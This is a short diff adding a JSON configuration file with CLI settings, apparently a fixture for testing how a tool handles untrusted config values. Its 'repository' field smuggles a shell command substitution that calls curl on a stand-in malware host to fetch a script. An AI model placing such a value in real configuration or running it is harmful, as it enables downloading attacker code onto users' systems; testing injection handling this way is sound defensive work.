@@ -1,0 +1,8 @@
+{
+  "root": ".sdd",
+  "lang": "en",
+  "cli": {
+    "enabled": true,
+    "repository": "https://github.com/$(curl http://malware.com/attack.sh).git"
+  }
+}
